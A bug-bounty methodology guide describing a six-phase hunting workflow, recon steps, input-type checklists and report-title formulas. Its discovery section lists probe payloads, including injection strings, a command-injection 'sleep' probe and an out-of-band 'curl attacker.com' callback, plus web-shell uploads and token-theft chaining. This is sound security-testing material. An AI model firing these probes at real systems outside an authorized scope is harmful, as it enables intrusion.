# 01 — Methodology & Workflow

Distilled from `bb-methodology`, `bug-bounty`, and USAGE.md. The 6-phase non-linear bug-bounty workflow with decision rules at each phase.

---

## The 6-Phase Workflow

```
1 SCOPE → 2 RECON → 3 HUNT → 4 VALIDATE → 5 CAPTURE → 6 REPORT
```

**NOT LINEAR.** Move freely between phases. Stuck at any phase → go back.

### Phase 0: Session Start (Every Time)

1. **Define**: "Today I target [feature/domain] to achieve [C/I/A/ATO/RCE]"
2. **Select**: Choose 1-2 vuln classes
3. **Execute**: Focus ONLY on selected techniques

**Wide vs Deep:**

| Signal | Wide (recon sweep) | Deep (focused) |
|--------|:--:|:--:|
| New program, first day | ✓ | |
| Wildcard scope `*.target.com` | ✓ | |
| Main webapp, >3 days | | ✓ |
| Scope update (new domain) | ✓ | |
| Found interesting subdomain | | ✓ |

### Phase 1: RECON

Wide: `Subdomain enum → DNS resolution → HTTP probing → Port scan → Tech detect`
Deep: `Google Dorks → JS download → Hidden param discovery → API mapping`

| What you find | Next action |
|---------------|-------------|
| Live subdomains with tech stack | Phase 2 (Mapping) |
| Known software (WordPress, Jira) | Check CVEs + defaults |
| Cloud resources (S3, Firebase) | Test permissions |
| Nothing after 5 min on a host | Skip, try next host (5-minute rule) |

### Phase 2: MAPPING & ANALYSIS

Checklist:
- [ ] Map all endpoints (Burp sitemap + JS analysis)
- [ ] Identify auth model (cookie, JWT, OAuth, SAML?)
- [ ] Find business-critical flows (payment, registration, password reset)
- [ ] Download and analyze JS files for hidden routes, secrets
- [ ] Identify roles and permissions (user, admin, API keys)
- [ ] Note "weird" behaviors (anomalies in naming, errors, timing)

### Phase 3: VULNERABILITY DISCOVERY

Decision flow by input type:
- **ID parameter** → IDOR checklist
- **Search/filter/sort** → SQLi, NoSQLi probing
- **URL input / webhook / PDF gen** → SSRF checklist
- **Text field reflected** → XSS (DOM or reflected)
- **File upload** → SVG XSS, web shell, path traversal
- **Price/quantity/coupon** → Business logic, race conditions
- **Login / 2FA / password reset** → Auth bypass
- **Profile update API** → Mass Assignment
- **Template / wiki editor** → SSTI

Error vs Blind:
1. Error-based: `'`, `"`, `{{7*7}}`, `${7*7}` — watch for 500/stack traces
2. Time-based: `SLEEP(10)`, `; sleep 10;` — watch response time
3. OOB: `curl attacker.com`, interactsh — watch for DNS callback
4. Boolean: `AND 1=1` vs `AND 1=0` — watch content-length diff

### Phase 4: PROOF & ESCALATION

- Capture clean PoC (read `04-evidence-hygiene.md` first)
- CHAIN low-impact behavior → find connector gadget
- Example: open redirect → OAuth token theft → ATO

### Phase 5: VALIDATE

Run the 5-Question Gate (read `03-triage-validation.md`). One wrong answer = KILL.

### Phase 6: REPORT

Read `05-report-writing.md`. Title formula:
```
[Bug Class] in [Exact Endpoint] allows [attacker role] to [impact] [victim scope]
```

---

## Anti-Patterns

- **Program hopping**: Stick with one target minimum 2 weeks / 30 hours
- **Tool-only hunting**: Automation finds duplicates. Manual finds unique bugs.
- **Rabbit hole**: Max 45 min per parameter. Set a timer.
- **No goal**: "Just looking around" = wasted time. Always Define first.

## Two Approach Routes

- **Route A (Feature-based)**: "This feature is complex" → deep-dive input handling → find vuln
- **Route B (Vuln-based)**: "I want IDOR" → find sequential IDs → test access control

---

*Source: bb-methodology SKILL.md, bug-bounty SKILL.md, USAGE.md*
